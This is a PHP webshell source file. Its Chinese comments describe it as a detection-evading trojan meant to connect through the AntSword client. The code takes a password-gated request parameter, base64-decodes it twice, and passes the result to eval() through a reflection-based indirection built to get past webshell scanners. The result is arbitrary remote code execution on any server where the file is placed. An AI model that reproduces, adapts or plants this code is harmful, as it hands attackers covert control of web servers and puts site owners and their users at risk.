<?php
/*
 * @Author : 青山(一个大混子)
 * @PHP免杀测试
 * @使用方法：名称必须为：Command.php antswrod 自定义编码器 即可链接
 * @介绍：第四版php免杀木马 在线webshell检测：全绿
 * @编码器：同第二版
 */

//去除报错
error_reporting(0);

class go {

    //password
    public $pass = "qingshan";

    public function run(){
        if($this->checkPass()){
            $param = $this->parser($this->getData());
            if($param){
                $instance = new Pwaf();
                $reflectionClass = new ReflectionClass('Pwaf');
                $reflectionProperty = $reflectionClass->getProperty($instance->func);
                $reflectionProperty->setAccessible(true);
                $command = $reflectionProperty->getValue($instance);
                $reflectionMethod = new ReflectionFunction($command);
                $result = $reflectionMethod->invoke($param);
                echo $result;
            }else{
                echo "parser is wrong!";
            }
        }else{
            echo "pass is wrong!";
        }
    }
    //检查key
    public function checkPass(){
        if(isset($_REQUEST[$this->pass])){
            return true;
        }
        return false;
    }
    //获取请求数据
    public function getData(){
        $data = $_REQUEST[$this->pass];
        return $data;
    }
    //解析参数加密
    public function parser($param){
        $data = base64_decode($param);
        $key = substr($data,0,strlen($this->pass));
        if ($key == $this->pass){
            $data = substr_replace($data,'',0,strlen($this->pass));
            $this->data = base64_decode($data);
            return base64_decode($data);
        }else{
            return false;
        }
    }
}

class Pwaf {
    private  $Command; //修改文件名请修改这里
    public  $func;

    public function __construct() {
        $this->func = explode('.',basename(__file__))[0];
        $this->Command = function ($param) {  return eval($param.'exit();//'); }; //修改文件名请修改这里
    }
}

$a = new go();
$reflectionClass = new ReflectionClass('go');
$reflectionMethod = $reflectionClass->getMethod('run');
$reflectionMethod->invoke($a);